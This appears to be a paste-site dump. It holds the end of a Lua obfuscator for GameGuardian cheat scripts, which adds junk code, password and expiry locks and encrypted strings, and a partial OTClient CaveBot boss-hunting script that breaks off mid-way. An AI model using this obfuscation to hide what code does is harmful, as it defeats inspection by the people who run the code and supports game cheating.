{nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
key2 = 12 
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
function KeyToInt()
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
return_key = key1 + key2 
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
return return_key
end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
local KONZLET = function(str, textKey)
local text = ''
for x in str:gmatch('#(%d+)') do
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
text = text .. string.char(x - KeyToInt(textKey) %256)
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
end
text = text:gsub([[\n]], ""\n"")
return text
end
MR = _G
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
]============================================]
DATA = data_read(g.info[1], mode_read_only, mode_read_all)
if g.info[3] ~= false then
day = os.date(""%d"")
Exp_date = gg.prompt({
""📆 设置过期日 : "",
""📢 过期后提示 : "",
}, {
os.date(""%Y%m"" .. day + 1),
""⚠️ 脚本已过期 ⚠️️"",
}, {
""text"", 
""text"",
})
if not Exp_date then break end
if Exp_date[1] == """" then 
return gg.alert(""⚠️ 错误 ⚠️\n\n过期日不可为空！"")
end
if Exp_date[2] == """" then
return gg.alert(""⚠️ 错误 ⚠️\n\n过期后提示不可为空！"")
end
if (string.len(Exp_date[1]) ~= 8) then
return gg.alert(""⚠️ 错误 ⚠️\n\n日期超出范围限制！"")
end
if Exp_date[1] and Exp_date[2] ~= nil then
Exp_data = [[
if os.date(""%Y%m%d"") >= ""]] .. Exp_date[1] .. [["" then 
print(""]] .. Exp_date[2] .. [["") 
return gg.alert(""]] .. Exp_date[2] .. [["")
end
]]
else
return gg.alert(""⚠️ 出错了 ⚠️"")
end
Expiry_info = ""已添加过期日 : "" .. Exp_date[1]
DATA = Exp_data .. DATA
end
if g.info[4] ~= false then
P4SS = gg.prompt({
""🔑 设置密码 :"",
""📝 密码错误提示 :"",
}, {
"""",
""⚠️ 密码错误 ⚠️"",
}, {
""text"",
""text"",
})
if not P4SS then break end
if P4SS[1] == """" then 
return gg.alert(""⚠️ 错误 ⚠️\n\n密码不可为空！"")
end
if P4SS[2] == """" then
return gg.alert(""⚠️ 错误 ⚠️\n\n密码错误提示不可为空！"")
end 
if P4SS[1] and P4SS[2] ~= nil then
Password = [[
Pazzword = ""]] .. P4SS[1] .. [[""
PW = gg.prompt({
""输入密码: "",
}, nil, {
""text"",
})
if not PW then return end
if PW[1] ~= Pazzword then
print(""]] .. P4SS[2] .. [["")
return gg.alert(""]] .. P4SS[2] .. [["")
else
gg.toast(""密码正确"")
gg.sleep(""1000"")
end
]]
else
return gg.alert(""⚠️ 出错了 ⚠️"")
end
Password_info = "" 密码已添加 : "" .. P4SS[1]
DATA = Password .. DATA
end
gg.toast(""⏳加载中…"")
LUA_Data_sub = DATA
LUA_Data_sub = LUA_Data_sub:gsub('%""(.-)%""', function(text)
text = 'KONZLET(""' .. Encrypt(text) .. '"")'
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""%'(.-)%'"", function(text)
text = 'KONZLET(""' .. Encrypt(text) .. '"")'
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""gg%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""gg"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""os%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""os"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""io%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""io"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""string%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""string"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""table%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""table"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""math%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""math"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""debug%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""debug"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""print%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""print"") .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""loadfile%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""loadfile"") .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""load%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""load"") .. '"")]('
return text
end)
DATA = Decrypt .. LUA_Data_sub
DATA = string.dump(load(""local _Title = [[🛡 Encode by Misterz Konzlet 🛡]]\nlocal __ = function()\n"" .. DATA .. ""\nend\n__()\n""), true)
DATA = DATA .. ""@Misterz Konzlet""
local function randomString(length)
local random = """"
local characters = {""A"", ""B"", ""C"", ""D"", ""E"", ""F"", ""G"", ""H"", ""I"", ""J"", ""K"", ""L"", ""M"", ""N"", ""O"", ""P"", ""Q"", ""R"", ""S"", ""T"", ""U"", ""V"", ""W"", ""X"", ""Y"", ""Z"", ""a"", ""b"", ""c"", ""d"", ""e"", ""f"", ""g"", ""h"", ""i"", ""j"", ""k"", ""l"", ""m"", ""n"", ""o"", ""p"", ""q"", ""r"", ""s"", ""t"", ""u"", ""v"", ""w"", ""x"", ""y"", ""z""}
for i=1, length do
random = random..characters[math.random(1, #characters)]
end
return random
end
local String = randomString(10000)
local Decode = String .. [[=function(code)code=load(code)()return code;end;]]
DATA = DATA:gsub(""."", function(code) 
return ""\\"" .. code:byte()
end)
DATA = Decode .. String .. '(""' .. DATA .. '"")'
DATA = [=================================================================[
-- Game Guardian Obfuscator by ༆Shadow Gaming࿐
-- Version 1.1
]=================================================================] .. DATA
if load(DATA) ~= nil then
if Expiry_info == nil then 
Expiry_info = "" 已设置过期日 : 否"" 
end
if Password_info == nil then 
Password_info = ""密码已启用 : 否"" 
end
data_write(LUA_Script_out, mode_write_only, DATA)
gg.sleep(""1000"", gg.toast(""完成 ✔️""))
gg.setVisible(true)
print("" 脚本加密完成 "")
print("""")
print("""")
print(Expiry_info)
print("""")
print(Password_info)
print("""")
print("""")
print(""📂 脚本已保存到 : "" .. LUA_Script_out)
os.exit()
else
gg.alert(""脚本无法加密\n\n请修复代码后再试"")
return os.remove(LUA_Script_out)
end
end
end
end
)()
end
function End()
print("" Developed by Shadow Gaming "")
gg.setVisible(true)
os.exit()
end
while(true)do
gg.sleep(1)
if gg.isVisible(true) then
FMXR=1
gg.setVisible(false)
end
if FMXR==1 then
Main()
end
end"
9nTGNBcz,Untitled,martintokio,Lua,Tuesday 17th of June 2025 07:54:19 AM CDT,"label:bossSpot1
goto:1284,1719,7,0
poscheck:bossSpot1,1,1284,1719,7
use:1285,1720,7
function:[[

--Walk On Item

local id = 15989

local distance = 1

function findObjectInMap(id, distance)

local tiles = g_map.getTiles(posz())

   for i, tile in ipairs(tiles) do

    for u, item in ipairs(tile:getItems()) do

      if item:getId() == id and getDistanceBetween(pos(), tile:getPosition()) <= distance then

        autoWalk(tile:getPosition(), 100, {ignoreNonPathable = true})

          CaveBot.delay(500)

          return

      end

    end

end

end

findObjectInMap(id, distance)

return true


]]
label:bossAlive
function:[[

--Check Bosses

local minMonsters = 1

local whitelistMonsters = { ""big dinozaur"", ""elite hobo"", ""big bandit"", ""infected saibamen"", ""mystic namekjin"", ""mystic cooler"", ""ultra namekjin"", ""golden cell"", ""gold cell"", ""gold majin"", ""gold namekjin"", ""mystic janemba"", ""mystic shin"", ""mystic jiren"", ""fury bardock"", ""mystic uub"", ""mystic machin"", ""mystic invader"", ""legendary saiyan"", ""mystic tsuful"", ""mystic tenshin"", ""espinor"", ""ultra warrior"", ""evil legendary tsuful"", ""dark kenny"", ""strong legendary krillin"", ""strong ice dragon"", ""strong fire dragon"", ""dabura"", ""doton ninja"", ""king emeads"", ""ivision"", ""ultra tapion"", ""ultra  majin"", ""strong ancient bandit"", ""strong xicor"", ""strong brolly"", ""gogeta ssj4"", ""gold janemba"", ""gold beerus"", ""explosive barrel"", ""dr gero"", ""fire ball""}

local creatureCount = 0

for _, mob in ipairs(getSpectators(posz())) do

    if mob:isMonster() and table.find(whitelistMonsters, mob:getName():lower()) then

        creatureCount = creatureCount + 1

    end

end

if creatureCount >= minMonsters then

    CaveBot.gotoLabel(""bossAlive"")

    CaveBot.delay(5000)

end

return creatureCount >= minMonsters


]]
label:bossSpot2
goto:1284,1719,7,0
poscheck:bossSpot2,1,1284,1719,7
function:[[

--Walk On Item

local id = 15989

local distance = 1

function findObjectInMap(id, distance)

local tiles = g_map.getTiles(posz())

   for i, tile in ipairs(tiles) do

    for u, item in ipairs(tile:getItems()) do

      if item:getId() == id and getDistanceBetween(pos(), tile:getPosition()) <= distance then

        autoWalk(tile:getPosition(), 100, {ignoreNonPathable = true})

          CaveBot.delay(500)

          return

      end

    end

end

end

findObjectInMap(id, distance)

return true


]]
use:1285,1720,7
function:[[

--Check Bosses

local minMonsters = 1

